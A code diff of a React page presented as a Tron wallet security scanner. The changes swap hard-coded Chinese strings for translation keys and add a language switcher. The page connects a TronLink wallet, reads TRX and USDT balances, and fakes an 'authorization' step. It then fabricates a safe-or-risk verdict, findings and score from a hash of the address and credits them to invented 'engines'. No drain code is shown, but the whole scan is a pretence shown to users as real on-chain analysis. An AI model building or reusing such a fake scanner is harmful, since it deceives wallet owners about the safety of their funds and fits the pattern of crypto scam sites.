@@ -20,114 +20,21 @@ import {
 } from "lucide-react";
 import TronWeb from "tronweb";
 import { useEffect, useMemo, useState } from "react";
+import { useTranslation } from "react-i18next";
 
+import LanguageSwitcher from "@/components/LanguageSwitcher";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SCAN_MESSAGES = [
-  "正在分析交易记录...",
-  "正在检测风险地址关联...",
-  "正在分析资金来源...",
-  "正在评估风险等级...",
-];
-
-const TRUST_POINTS = [
-  "基于链上大数据分析",
-  "多维度风控识别",
-  "实时风险检测系统",
-  "智能风险识别系统",
-  "实时风控检测引擎",
-];
-
-const FLOW_STEPS: Array<{
-  icon: LucideIcon;
-  title: string;
-  description: string;
-  liveText: string;
-  phase: string;
-  visual: "connect" | "authorize" | "scan" | "result";
-}> = [
-  {
-    icon: Wallet,
-    title: "连接钱包",
-    description: "识别 Tron 钱包环境并读取地址与余额。",
-    liveText: "正在识别钱包环境、地址状态与基础资产快照。",
-    phase: "Wallet Handshake",
-    visual: "connect",
-  },
-  {
-    icon: ShieldEllipsis,
-    title: "授权检测",
-    description: "发起检测授权并准备进入风险分析。",
-    liveText: "正在确认授权状态并同步检测会话与签名反馈。",
-    phase: "Permission Sync",
-    visual: "authorize",
-  },
-  {
-    icon: Network,
-    title: "链上分析",
-    description: "交叉分析资金路径、关联网络与行为模式。",
-    liveText: "正在追踪链上路径、风险标签与地址网络联动。",
-    phase: "On-chain Analysis",
-    visual: "scan",
-  },
-  {
-    icon: CheckCircle2,
-    title: "输出结论",
-    description: "生成安全结论、风险评分与操作建议。",
-    liveText: "正在生成安全结论、风险评分与后续处理建议。",
-    phase: "Risk Verdict",
-    visual: "result",
-  },
-];
-
-const SUPPORTED_WALLETS = [
-  { name: "TronLink", variant: "tronlink" },
-  { name: "imToken", variant: "imtoken" },
-  { name: "TokenPocket", variant: "tokenpocket" },
-  { name: "Trust Wallet", variant: "trust" },
-] as const;
-
-const FEATURES: Array<{
-  icon: LucideIcon;
-  title: string;
-  description: string;
-  detail: string;
-  visual: "blacklist" | "network" | "source" | "behavior";
-}> = [
-  {
-    icon: BadgeAlert,
-    title: "黑名单检测",
-    description: "识别黑名单资金、诈骗标签与异常对手方轨迹。",
-    detail: "交叉命中黑名单标签库、风险收款路径和异常交互对象，快速识别污染资金来源。",
-    visual: "blacklist",
-  },
-  {
-    icon: Waypoints,
-    title: "风险地址识别",
-    description: "分析与高风险地址的链上关联与交互强度。",
-    detail: "从多跳交易网络中识别可疑连接路径，展示高风险节点与关联密度变化。",
-    visual: "network",
-  },
-  {
-    icon: FileSearch,
-    title: "资金来源分析",
-    description: "追踪资金路径，判断来源是否干净与稳定。",
-    detail: "追踪入账源头、流转方向与沉淀周期，帮助判断资金是否存在异常迁移或混入。",
-    visual: "source",
-  },
-  {
-    icon: Activity,
-    title: "地址行为分析",
-    description: "识别临时地址、诱饵地址与高频异常行为。",
-    detail: "从活跃时长、交互频次、余额变化和测试性行为中识别异常模式与诱饵特征。",
-    visual: "behavior",
-  },
-];
+const SCAN_MESSAGE_COUNT = 4;
+const TRUST_POINT_COUNT = 5;
 
 type Stage = "home" | "connected" | "authorizing" | "scanning" | "safe" | "risk";
 type Tone = "safe" | "neutral" | "risk";
+type WorkflowVisual = "connect" | "authorize" | "scan" | "result";
+type FeatureVisualType = "blacklist" | "network" | "source" | "behavior";
+type TranslationMessage = { key: string; values?: Record<string, string | number> };
 
 interface WalletState {
   address: string;
@@ -136,26 +43,46 @@ interface WalletState {
 }
 
 interface ReportMetric {
-  label: string;
-  value: string;
+  labelKey: string;
+  valueKey: string;
   tone: Tone;
 }
 
 interface ReportFinding {
-  title: string;
-  description: string;
+  titleKey: string;
+  descriptionKey: string;
 }
 
 interface RiskReport {
   verdict: "safe" | "risk";
   score: number;
-  title: string;
-  subtitle: string;
+  titleKey: string;
+  subtitleKey: string;
   findings: ReportFinding[];
   metrics: ReportMetric[];
-  recommendations: string[];
+  recommendationKeys: string[];
   engine: string;
 }
+
+const FLOW_STEPS_META: Array<{
+  icon: LucideIcon;
+  visual: WorkflowVisual;
+}> = [
+  { icon: Wallet, visual: "connect" },
+  { icon: ShieldEllipsis, visual: "authorize" },
+  { icon: Network, visual: "scan" },
+  { icon: CheckCircle2, visual: "result" },
+];
+
+const FEATURE_META: Array<{
+  icon: LucideIcon;
+  visual: FeatureVisualType;
+}> = [
+  { icon: BadgeAlert, visual: "blacklist" },
+  { icon: Waypoints, visual: "network" },
+  { icon: FileSearch, visual: "source" },
+  { icon: Activity, visual: "behavior" },
+];
 
 declare global {
   interface Window {
@@ -173,53 +100,39 @@ declare global {
 }
 
 const truncateAddress = (address: string) => `${address.slice(0, 6)}...${address.slice(-4)}`;
-const formatAmount = (value: number) => new Intl.NumberFormat("en-US", { maximumFractionDigits: 2 }).format(value);
+const formatAmount = (value: number, locale: string) => new Intl.NumberFormat(locale, { maximumFractionDigits: 2 }).format(value);
 const sleep = (ms: number) => new Promise((resolve) => window.setTimeout(resolve, ms));
 
 const buildRiskReport = (address: string): RiskReport => {
   const seed = Array.from(address).reduce((total, char, index) => total + char.charCodeAt(0) * (index + 1), 0);
-  const issuePool: ReportFinding[] = [
-    {
-      title: "涉嫌黑名单资金",
-      description: "检测到近期入账路径与历史风险地址存在交集，资金洁净度偏低。",
-    },
-    {
-      title: "与高风险地址存在关联",
-      description: "交易网络中存在多跳关联，关联地址在高风险标签库中命中。",
-    },
-    {
-      title: "地址行为异常",
-      description: "短时间内出现高频转入转出，行为模式与正常钱包不一致。",
-    },
-    {
-      title: "可能为诱饵地址",
-      description: "余额较低但交互频次偏高，存在诱导收款或异常测试行为。",
-    },
-    {
-      title: "临时地址特征明显",
-      description: "地址活跃周期短且链上沉淀不足，存在一次性使用迹象。",
-    },
-  ];
+  const issuePool: ReportFinding[] = [0, 1, 2, 3, 4].map((index) => ({
+    titleKey: `report.risk.issuePool.${index}.title`,
+    descriptionKey: `report.risk.issuePool.${index}.description`,
+  }));
 
   if (seed % 4 === 0) {
     return {
       verdict: "safe",
       score: 12 + (seed % 16),
-      title: "该地址安全",
-      subtitle: "未检测到风险行为，链上交互模式保持稳定。",
+      titleKey: "report.safe.title",
+      subtitleKey: "report.safe.subtitle",
       findings: [
         {
-          title: "资金来源正常",
-          description: "主要资金来自低风险路径，未发现异常扩散或污染迹象。",
+          titleKey: "report.safe.findings.0.title",
+          descriptionKey: "report.safe.findings.0.description",
         },
       ],
       metrics: [
-        { label: "风险评分", value: "低", tone: "safe" },
-        { label: "资金来源", value: "正常", tone: "safe" },
-        { label: "地址行为", value: "正常", tone: "safe" },
-        { label: "关联地址", value: "无风险", tone: "safe" },
+        { labelKey: "report.safe.metrics.riskScore", valueKey: "report.safe.metrics.low", tone: "safe" },
+        { labelKey: "report.safe.metrics.fundSource", valueKey: "report.safe.metrics.normal", tone: "safe" },
+        { labelKey: "report.safe.metrics.addressBehavior", valueKey: "report.safe.metrics.normal", tone: "safe" },
+        { labelKey: "report.safe.metrics.linkedAddresses", valueKey: "report.safe.metrics.noRisk", tone: "safe" },
       ],
-      recommendations: ["可继续常规使用", "建议保留小额测试习惯", "持续关注新的链上交互"],
+      recommendationKeys: [
+        "report.safe.recommendations.0",
+        "report.safe.recommendations.1",
+        "report.safe.recommendations.2",
+      ],
       engine: seed % 2 === 0 ? "Tron Secure Engine™" : "Chain Risk Analyzer™",
     };
   }
@@ -229,16 +142,20 @@ const buildRiskReport = (address: string): RiskReport => {
   return {
     verdict: "risk",
     score: 76 + (seed % 19),
-    title: "检测到风险",
-    subtitle: "当前地址命中多个异常维度，建议立即谨慎处理。",
+    titleKey: "report.risk.title",
+    subtitleKey: "report.risk.subtitle",
     findings: selectedFindings.length > 0 ? selectedFindings : issuePool.slice(0, 3),
     metrics: [
-      { label: "风险评分", value: "高", tone: "risk" },
-      { label: "资金来源", value: "可疑", tone: "risk" },
-      { label: "地址行为", value: "异常", tone: "risk" },
-      { label: "关联地址", value: "高风险关联", tone: "risk" },
+      { labelKey: "report.risk.metrics.riskScore", valueKey: "report.risk.metrics.high", tone: "risk" },
+      { labelKey: "report.risk.metrics.fundSource", valueKey: "report.risk.metrics.suspicious", tone: "risk" },
+      { labelKey: "report.risk.metrics.addressBehavior", valueKey: "report.risk.metrics.abnormal", tone: "risk" },
+      { labelKey: "report.risk.metrics.linkedAddresses", valueKey: "report.risk.metrics.linkedHighRisk", tone: "risk" },
     ],
-    recommendations: ["避免与该地址进一步交互", "谨慎转账并二次核验来源", "建议切换新地址隔离风险资金"],
+    recommendationKeys: [
+      "report.risk.recommendations.0",
+      "report.risk.recommendations.1",
+      "report.risk.recommendations.2",
+    ],
     engine: seed % 2 === 0 ? "Tron Secure Engine™" : "Chain Risk Analyzer™",
   };
 };
@@ -256,7 +173,7 @@ const BrandMark = () => (
   </div>
 );
 
-const WalletLogo = ({ variant }: { variant: (typeof SUPPORTED_WALLETS)[number]["variant"] }) => {
+const WalletLogo = ({ variant }: { variant: "tronlink" | "imtoken" | "tokenpocket" | "trust" }) => {
   if (variant === "tronlink") {
     return (
       <div className="wallet-logo-mark wallet-logo-tronlink" aria-hidden="true">
@@ -293,34 +210,45 @@ const WalletLogo = ({ variant }: { variant: (typeof SUPPORTED_WALLETS)[number]["
   );
 };
 
-const WalletSupportStrip = () => (
-  <section className="space-y-3">
-    <div className="flex items-center justify-between gap-3">
-      <p className="font-display text-base text-foreground">支持钱包</p>
-      <p className="text-xs uppercase tracking-[0.24em] subtle-copy">Wallet Ready</p>
-    </div>
-    <div className="grid grid-cols-2 gap-3">
-      {SUPPORTED_WALLETS.map((wallet) => (
-        <motion.div
-          key={wallet.name}
-          initial={{ opacity: 0, y: 10 }}
-          whileInView={{ opacity: 1, y: 0 }}
-          viewport={{ once: true, amount: 0.35 }}
-          transition={{ duration: 0.32 }}
-          className="wallet-chip"
-        >
-          <WalletLogo variant={wallet.variant} />
-          <div>
-            <p className="font-display text-sm text-foreground">{wallet.name}</p>
-            <p className="text-[11px] subtle-copy">兼容连接与授权流程</p>
-          </div>
-        </motion.div>
-      ))}
-    </div>
-  </section>
-);
+const SUPPORTED_WALLETS = [
+  { name: "TronLink", variant: "tronlink" as const },
+  { name: "imToken", variant: "imtoken" as const },
+  { name: "TokenPocket", variant: "tokenpocket" as const },
+  { name: "Trust Wallet", variant: "trust" as const },
+];
 
-const FeatureVisual = ({ visual }: { visual: (typeof FEATURES)[number]["visual"] }) => {
+const WalletSupportStrip = () => {
+  const { t } = useTranslation();
+
+  return (
+    <section className="space-y-3">
+      <div className="flex items-center justify-between gap-3">
+        <p className="font-display text-base text-foreground">{t("walletSupport.title")}</p>
+        <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("walletSupport.ready")}</p>
+      </div>
+      <div className="grid grid-cols-2 gap-3">
+        {SUPPORTED_WALLETS.map((wallet) => (
+          <motion.div
+            key={wallet.name}
+            initial={{ opacity: 0, y: 10 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            viewport={{ once: true, amount: 0.35 }}
+            transition={{ duration: 0.32 }}
+            className="wallet-chip"
+          >
+            <WalletLogo variant={wallet.variant} />
+            <div>
+              <p className="font-display text-sm text-foreground">{wallet.name}</p>
+              <p className="text-[11px] subtle-copy">{t("walletSupport.compatibility")}</p>
+            </div>
+          </motion.div>
+        ))}
+      </div>
+    </section>
+  );
+};
+
+const FeatureVisual = ({ visual }: { visual: FeatureVisualType }) => {
   if (visual === "blacklist") {
     return (
       <div className="feature-visual visual-blacklist" aria-hidden="true">
@@ -364,78 +292,76 @@ const FeatureVisual = ({ visual }: { visual: (typeof FEATURES)[number]["visual"]
 
 const FeatureCard = ({
   icon: Icon,
-  title,
-  description,
-  detail,
   visual,
   active,
   onClick,
   index,
 }: {
   icon: LucideIcon;
-  title: string;
-  description: string;
-  detail: string;
-  visual: (typeof FEATURES)[number]["visual"];
+  visual: FeatureVisualType;
   active: boolean;
   onClick: () => void;
   index: number;
-}) => (
-  <motion.button
-    type="button"
-    onClick={onClick}
-    initial={{ opacity: 0, y: 24 }}
-    whileInView={{ opacity: 1, y: 0 }}
-    viewport={{ once: true, amount: 0.25 }}
-    transition={{ duration: 0.35, delay: index * 0.06 }}
-    className={`tron-panel feature-card w-full rounded-[1.5rem] text-left ${active ? "feature-card-active" : ""}`}
-  >
-    <Card className="border-0 bg-transparent shadow-none">
-      <CardContent className="space-y-4 p-5">
-        <div className="flex items-start justify-between gap-4">
-          <div className="inline-flex rounded-2xl border border-border bg-accent/60 p-3 text-primary">
-            <Icon className="h-5 w-5" />
+}) => {
+  const { t } = useTranslation();
+
+  return (
+    <motion.button
+      type="button"
+      onClick={onClick}
+      initial={{ opacity: 0, y: 24 }}
+      whileInView={{ opacity: 1, y: 0 }}
+      viewport={{ once: true, amount: 0.25 }}
+      transition={{ duration: 0.35, delay: index * 0.06 }}
+      className={`tron-panel feature-card w-full rounded-[1.5rem] text-left ${active ? "feature-card-active" : ""}`}
+    >
+      <Card className="border-0 bg-transparent shadow-none">
+        <CardContent className="space-y-4 p-5">
+          <div className="flex items-start justify-between gap-4">
+            <div className="inline-flex rounded-2xl border border-border bg-accent/60 p-3 text-primary">
+              <Icon className="h-5 w-5" />
+            </div>
+            <FeatureVisual visual={visual} />
           </div>
-          <FeatureVisual visual={visual} />
-        </div>
-        <div>
-          <h3 className="font-display text-lg text-foreground">{title}</h3>
-          <p className="mt-2 text-sm leading-6 subtle-copy">{description}</p>
-        </div>
-        <AnimatePresence initial={false}>
-          {active && (
-            <motion.div
-              initial={{ opacity: 0, height: 0 }}
-              animate={{ opacity: 1, height: "auto" }}
-              exit={{ opacity: 0, height: 0 }}
-              transition={{ duration: 0.24 }}
-              className="overflow-hidden"
-            >
-              <div className="rounded-2xl border border-border bg-background/40 p-3">
-                <p className="text-sm leading-6 subtle-copy">{detail}</p>
-              </div>
-            </motion.div>
-          )}
-        </AnimatePresence>
-        <div className="flex items-center justify-between text-xs uppercase tracking-[0.22em] subtle-copy">
-          <span>{active ? "细节已展开" : "点击查看细节"}</span>
-          <ArrowRight className={`h-3.5 w-3.5 transition-transform duration-300 ${active ? "translate-x-1" : ""}`} />
-        </div>
-      </CardContent>
-    </Card>
-  </motion.button>
-);
+          <div>
+            <h3 className="font-display text-lg text-foreground">{t(`features.items.${index}.title`)}</h3>
+            <p className="mt-2 text-sm leading-6 subtle-copy">{t(`features.items.${index}.description`)}</p>
+          </div>
+          <AnimatePresence initial={false}>
+            {active && (
+              <motion.div
+                initial={{ opacity: 0, height: 0 }}
+                animate={{ opacity: 1, height: "auto" }}
+                exit={{ opacity: 0, height: 0 }}
+                transition={{ duration: 0.24 }}
+                className="overflow-hidden"
+              >
+                <div className="rounded-2xl border border-border bg-background/40 p-3">
+                  <p className="text-sm leading-6 subtle-copy">{t(`features.items.${index}.detail`)}</p>
+                </div>
+              </motion.div>
+            )}
+          </AnimatePresence>
+          <div className="flex items-center justify-between text-xs uppercase tracking-[0.22em] subtle-copy">
+            <span>{active ? t("features.detailExpanded") : t("features.clickForDetails")}</span>
+            <ArrowRight className={`h-3.5 w-3.5 transition-transform duration-300 ${active ? "translate-x-1" : ""}`} />
+          </div>
+        </CardContent>
+      </Card>
+    </motion.button>
+  );
+};
 
 const StepIndicator = ({ currentStep }: { currentStep: number }) => {
-  const steps = ["连接钱包", "授权检测", "链上分析", "结果输出"];
+  const { t } = useTranslation();
 
   return (
     <div className="grid grid-cols-4 gap-2">
-      {steps.map((step, index) => {
+      {Array.from({ length: 4 }).map((_, index) => {
         const isActive = currentStep >= index + 1;
         return (
           <div
-            key={step}
+            key={index}
             className={`rounded-2xl border px-2 py-3 text-center text-[11px] font-medium ${
               isActive ? "border-primary bg-accent/80 text-foreground" : "border-border bg-card/60 subtle-copy"
             }`}
@@ -443,7 +369,7 @@ const StepIndicator = ({ currentStep }: { currentStep: number }) => {
             <div className="mx-auto mb-2 flex h-6 w-6 items-center justify-center rounded-full border border-current text-[10px]">
               {index + 1}
             </div>
-            {step}
+            {t(`detector.stepIndicator.${index}`)}
           </div>
         );
       })}
@@ -451,7 +377,7 @@ const StepIndicator = ({ currentStep }: { currentStep: number }) => {
   );
 };
 
-const WorkflowStageVisual = ({ visual }: { visual: (typeof FLOW_STEPS)[number]["visual"] }) => {
+const WorkflowStageVisual = ({ visual }: { visual: WorkflowVisual }) => {
   if (visual === "connect") {
     return (
       <div className="workflow-stage-visual workflow-stage-connect" aria-hidden="true">
@@ -509,18 +435,28 @@ const WorkflowAnimation = ({
   activeStep: number;
   onStepSelect: (step: number) => void;
 }) => {
-  const step = FLOW_STEPS[activeStep];
+  const { t } = useTranslation();
+
+  const steps = FLOW_STEPS_META.map((item, index) => ({
+    ...item,
+    title: t(`workflow.steps.${index}.title`),
+    description: t(`workflow.steps.${index}.description`),
+    liveText: t(`workflow.steps.${index}.liveText`),
+    phase: t(`workflow.steps.${index}.phase`),
+  }));
+
+  const step = steps[activeStep];
 
   return (
     <section className="workflow-shell overflow-hidden rounded-[1.75rem] border border-border p-5">
       <div className="flex items-center justify-between gap-3">
         <div>
-          <p className="font-display text-xl text-foreground">检测流程演示</p>
-          <p className="mt-1 text-sm subtle-copy">通过更强的主舞台和分段流动轨道，让用户一眼看懂检测是如何推进的。</p>
+          <p className="font-display text-xl text-foreground">{t("workflow.title")}</p>
+          <p className="mt-1 text-sm subtle-copy">{t("workflow.subtitle")}</p>
         </div>
         <div className="tron-badge text-xs">
           <span className="info-dot" />
-          Process Flow
+          {t("workflow.badge")}
         </div>
       </div>
 
@@ -530,10 +466,10 @@ const WorkflowAnimation = ({
           <div className="workflow-stage-grid" />
           <div className="relative z-10 flex items-start justify-between gap-4">
             <div>
-              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">当前焦点阶段</p>
+              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("workflow.focusLabel")}</p>
               <AnimatePresence mode="wait">
                 <motion.div
-                  key={step.title}
+                  key={activeStep}
                   initial={{ opacity: 0, y: 14 }}
                   animate={{ opacity: 1, y: 0 }}
                   exit={{ opacity: 0, y: -12 }}
@@ -548,7 +484,7 @@ const WorkflowAnimation = ({
             </div>
             <div className="workflow-stage-badge">
               <span className="info-dot" />
-              系统自动讲解中
+              {t("workflow.autoNarration")}
             </div>
           </div>
 
@@ -567,12 +503,12 @@ const WorkflowAnimation = ({
             </AnimatePresence>
 
             <div className="workflow-stage-copy">
-              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">流程推进状态</p>
-              <p className="mt-3 text-sm leading-6 subtle-copy">上一阶段完成后，能量流将沿轨道推送至下一节点，形成连续检测反馈。</p>
+              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("workflow.progressLabel")}</p>
+              <p className="mt-3 text-sm leading-6 subtle-copy">{t("workflow.progressDescription")}</p>
               <div className="mt-4 workflow-track">
                 <div className="workflow-line" />
                 <div className="workflow-segments">
-                  {FLOW_STEPS.slice(0, -1).map((segment, index) => (
+                  {steps.slice(0, -1).map((segment, index) => (
                     <div
                       key={`${segment.title}-segment`}
                       className={`workflow-segment ${activeStep >= index + 1 ? "workflow-segment-active" : ""}`}
@@ -594,14 +530,14 @@ const WorkflowAnimation = ({
         </div>
 
         <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
-          {FLOW_STEPS.map((item, index) => {
+          {steps.map((item, index) => {
             const Icon = item.icon;
             const isActive = index === activeStep;
             const isPast = index < activeStep;
 
             return (
               <motion.button
-                key={item.title}
+                key={`${item.visual}-${index}`}
                 type="button"
                 onClick={() => onStepSelect(index)}
                 animate={{ y: isActive ? -6 : 0, scale: isActive ? 1.02 : 1 }}
@@ -673,12 +609,23 @@ const NetworkMesh = () => {
 };
 
 const Index = () => {
+  const { t, i18n } = useTranslation();
+  const locale = i18n.resolvedLanguage ?? "en";
+  const scanMessages = useMemo(
+    () => Array.from({ length: SCAN_MESSAGE_COUNT }, (_, index) => t(`detector.scanning.messages.${index}`)),
+    [t, i18n.resolvedLanguage],
+  );
+  const trustPoints = useMemo(
+    () => Array.from({ length: TRUST_POINT_COUNT }, (_, index) => t(`trust.points.${index}`)),
+    [t, i18n.resolvedLanguage],
+  );
+
   const [stage, setStage] = useState<Stage>("home");
   const [wallet, setWallet] = useState<WalletState | null>(null);
   const [report, setReport] = useState<RiskReport | null>(null);
   const [isConnecting, setIsConnecting] = useState(false);
-  const [error, setError] = useState<string | null>(null);
-  const [helperText, setHelperText] = useState("连接钱包后即可开始安全检测流程。");
+  const [error, setError] = useState<TranslationMessage | null>(null);
+  const [helperText, setHelperText] = useState<TranslationMessage>({ key: "detector.helper.initial" });
   const [scanStep, setScanStep] = useState(0);
   const [showDetails, setShowDetails] = useState(false);
   const [activeFeature, setActiveFeature] = useState(0);
@@ -702,7 +649,7 @@ const Index = () => {
 
   useEffect(() => {
     const timeout = window.setTimeout(() => {
-      setActiveFlowStep((prev) => (prev + 1) % FLOW_STEPS.length);
+      setActiveFlowStep((prev) => (prev + 1) % FLOW_STEPS_META.length);
     }, 2800);
 
     return () => window.clearTimeout(timeout);
@@ -713,7 +660,7 @@ const Index = () => {
 
     setScanStep(0);
     const interval = window.setInterval(() => {
-      setScanStep((prev) => (prev + 1) % SCAN_MESSAGES.length);
+      setScanStep((prev) => (prev + 1) % SCAN_MESSAGE_COUNT);
     }, 900);
 
     const timeout = window.setTimeout(() => {
@@ -721,7 +668,7 @@ const Index = () => {
       setReport(nextReport);
       setStage(nextReport.verdict);
       setShowDetails(false);
-      setHelperText(`${nextReport.engine} 已完成多维链上分析`);
+      setHelperText({ key: "detector.helper.scanComplete", values: { engine: nextReport.engine } });
     }, 4200 + (wallet.address.charCodeAt(3) % 1400));
 
     return () => {
@@ -733,7 +680,7 @@ const Index = () => {
   const connectWallet = async () => {
     setIsConnecting(true);
     setError(null);
-    setHelperText("正在请求钱包连接...");
+    setHelperText({ key: "detector.helper.connecting" });
 
     try {
       if (window.tronLink?.request) {
@@ -744,7 +691,7 @@ const Index = () => {
       const address = injectedTronWeb?.defaultAddress?.base58;
 
       if (!address || !TronWeb.utils.address.isAddress(address)) {
-        throw new Error("未检测到可用的 Tron 钱包，请在 TronLink 或钱包内置浏览器中打开。");
+        throw new Error("walletUnavailable");
       }
 
       const trxSun = (await injectedTronWeb?.trx?.getBalance?.(address)) ?? 0;
@@ -761,11 +708,12 @@ const Index = () => {
 
       setWallet({ address, trxBalance, usdtBalance });
       setStage("connected");
-      setHelperText("钱包已连接，地址合法性校验通过。");
+      setHelperText({ key: "detector.helper.connected" });
       document.getElementById("detector")?.scrollIntoView({ behavior: "smooth", block: "start" });
     } catch (caughtError) {
-      setError(caughtError instanceof Error ? caughtError.message : "钱包连接失败，请稍后重试。");
-      setHelperText("连接失败时可检查钱包权限或切换到支持 Tron 的浏览器。");
+      const key = caughtError instanceof Error && caughtError.message === "walletUnavailable" ? "errors.walletUnavailable" : "errors.walletConnectFailed";
+      setError({ key });
+      setHelperText({ key: "detector.helper.connectionFailedHint" });
     } finally {
       setIsConnecting(false);
     }
@@ -775,16 +723,16 @@ const Index = () => {
     if (!wallet) return;
 
     setError(null);
-    setHelperText("正在模拟 TRC20 USDT 授权反馈...");
+    setHelperText({ key: "detector.helper.authorizing" });
     setStage("authorizing");
 
     try {
       await sleep(1600);
-      setHelperText("授权成功，已进入链上风险检测。");
+      setHelperText({ key: "detector.helper.authorized" });
       setStage("scanning");
     } catch {
       setStage("connected");
-      setError("授权流程中断，请重新发起检测。");
+      setError({ key: "errors.authorizationInterrupted" });
     }
   };
 
@@ -793,7 +741,7 @@ const Index = () => {
     setReport(null);
     setError(null);
     setShowDetails(false);
-    setHelperText(wallet ? "钱包已连接，可再次发起检测。" : "连接钱包后即可开始安全检测流程。");
+    setHelperText({ key: wallet ? "detector.helper.resetConnected" : "detector.helper.resetHome" });
   };
 
   return (
@@ -806,11 +754,14 @@ const Index = () => {
 
       <div className="relative mx-auto flex min-h-screen w-full max-w-md flex-col px-4 pb-10 pt-6 sm:px-6">
         <header className="space-y-6">
-          <div className="flex items-center justify-between gap-4">
+          <div className="flex items-start justify-between gap-4">
             <BrandMark />
-            <div className="tron-badge text-xs">
-              <span className="info-dot" />
-              实时风控在线
+            <div className="flex flex-col items-end gap-2">
+              <div className="tron-badge text-xs">
+                <span className="info-dot" />
+                {t("hero.liveBadge")}
+              </div>
+              <LanguageSwitcher />
             </div>
           </div>
 
@@ -821,23 +772,19 @@ const Index = () => {
             className="space-y-5"
           >
             <div className="space-y-3">
-              <p className="tron-badge w-fit text-xs uppercase tracking-[0.28em]">钱包安全检测</p>
-              <h1 className="font-display text-4xl font-bold leading-tight tron-text-gradient">
-                先看懂支持与流程，再开始你的 Tron 钱包安全检测
-              </h1>
-              <p className="max-w-sm text-sm leading-7 subtle-copy">
-                通过钱包兼容展示、动态流程引导与能力细节动画，让用户在进入检测前先建立理解与信任。
-              </p>
+              <p className="tron-badge w-fit text-xs uppercase tracking-[0.28em]">{t("hero.badge")}</p>
+              <h1 className="font-display text-4xl font-bold leading-tight tron-text-gradient">{t("hero.title")}</h1>
+              <p className="max-w-sm text-sm leading-7 subtle-copy">{t("hero.subtitle")}</p>
             </div>
 
             <div className="grid grid-cols-2 gap-3 text-sm">
               <div className="data-tile">
-                <p className="subtle-copy">检测维度</p>
-                <p className="mt-2 font-display text-2xl text-foreground">7+</p>
+                <p className="subtle-copy">{t("hero.stats.dimensions.label")}</p>
+                <p className="mt-2 font-display text-2xl text-foreground">{t("hero.stats.dimensions.value")}</p>
               </div>
               <div className="data-tile">
-                <p className="subtle-copy">检测耗时</p>
-                <p className="mt-2 font-display text-2xl text-foreground">3-6s</p>
+                <p className="subtle-copy">{t("hero.stats.duration.label")}</p>
+                <p className="mt-2 font-display text-2xl text-foreground">{t("hero.stats.duration.value")}</p>
               </div>
             </div>
 
@@ -846,7 +793,7 @@ const Index = () => {
               className="tron-outline-button h-12 w-full rounded-2xl text-sm"
               onClick={() => document.getElementById("workflow")?.scrollIntoView({ behavior: "smooth", block: "start" })}
             >
-              先了解检测流程
+              {t("hero.ctaWorkflow")}
               <ChevronDown className="h-4 w-4" />
             </Button>
           </motion.section>
@@ -862,13 +809,13 @@ const Index = () => {
 
         <section id="features" className="mt-8 space-y-4">
           <div>
-            <p className="font-display text-2xl text-foreground">核心检测能力</p>
-            <p className="mt-2 text-sm leading-6 subtle-copy">每个能力卡片都带有示意动画，帮助用户理解系统到底在检测什么。</p>
+            <p className="font-display text-2xl text-foreground">{t("features.title")}</p>
+            <p className="mt-2 text-sm leading-6 subtle-copy">{t("features.subtitle")}</p>
           </div>
           <div className="grid gap-3">
-            {FEATURES.map((feature, index) => (
+            {FEATURE_META.map((feature, index) => (
               <FeatureCard
-                key={feature.title}
+                key={`${feature.visual}-${index}`}
                 {...feature}
                 index={index}
                 active={activeFeature === index}
@@ -882,14 +829,14 @@ const Index = () => {
           <div className="flex items-center gap-3">
             <Network className="h-5 w-5 text-primary" />
             <div>
-              <p className="font-display text-lg text-foreground">可信风控背书</p>
-              <p className="text-sm subtle-copy">基于链上大数据分析，强化用户对检测结果的理解与信任。</p>
+              <p className="font-display text-lg text-foreground">{t("trust.title")}</p>
+              <p className="text-sm subtle-copy">{t("trust.subtitle")}</p>
             </div>
           </div>
 
           <div className="trust-ticker mt-4">
             <div className="trust-ticker-track">
-              {[...TRUST_POINTS, ...TRUST_POINTS].map((item, index) => (
+              {[...trustPoints, ...trustPoints].map((item, index) => (
                 <div key={`${item}-${index}`} className="tron-badge whitespace-nowrap text-xs">
                   <span className="info-dot" />
                   {item}
@@ -901,8 +848,8 @@ const Index = () => {
 
         <section id="detector" className="mt-8 space-y-4">
           <div className="space-y-2 text-center">
-            <p className="font-display text-2xl text-foreground">立即开始钱包安全检测</p>
-            <p className="text-sm leading-6 subtle-copy">读完核心能力后再开始操作，让用户更清楚每一步正在发生什么。</p>
+            <p className="font-display text-2xl text-foreground">{t("detector.title")}</p>
+            <p className="text-sm leading-6 subtle-copy">{t("detector.subtitle")}</p>
           </div>
 
           <StepIndicator currentStep={currentStep} />
@@ -911,8 +858,8 @@ const Index = () => {
             <CardContent className="space-y-5 p-5">
               <div className="flex items-start justify-between gap-4">
                 <div>
-                  <p className="font-display text-xl text-foreground">检测控制台</p>
-                  <p className="mt-1 text-sm subtle-copy">连接钱包 → 授权并开始检测 → 输出安全结论</p>
+                  <p className="font-display text-xl text-foreground">{t("detector.consoleTitle")}</p>
+                  <p className="mt-1 text-sm subtle-copy">{t("detector.consoleSubtitle")}</p>
                 </div>
                 <div className="tron-badge text-xs">
                   <Zap className="h-3.5 w-3.5 text-primary" />
@@ -923,28 +870,26 @@ const Index = () => {
               {wallet && (
                 <div className="grid grid-cols-2 gap-3">
                   <div className="metric-chip">
-                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">钱包地址</p>
+                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("detector.wallet.addressLabel")}</p>
                     <p className="mt-2 font-display text-lg text-foreground">{truncateAddress(wallet.address)}</p>
-                    <p className="mt-2 text-xs text-success">地址校验通过</p>
+                    <p className="mt-2 text-xs text-success">{t("detector.wallet.addressValid")}</p>
                   </div>
                   <div className="metric-chip">
-                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">资产概览</p>
-                    <p className="mt-2 font-display text-lg text-foreground">{formatAmount(wallet.trxBalance)} TRX</p>
-                    <p className="mt-2 text-xs subtle-copy">{formatAmount(wallet.usdtBalance)} USDT</p>
+                    <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t("detector.wallet.assetOverview")}</p>
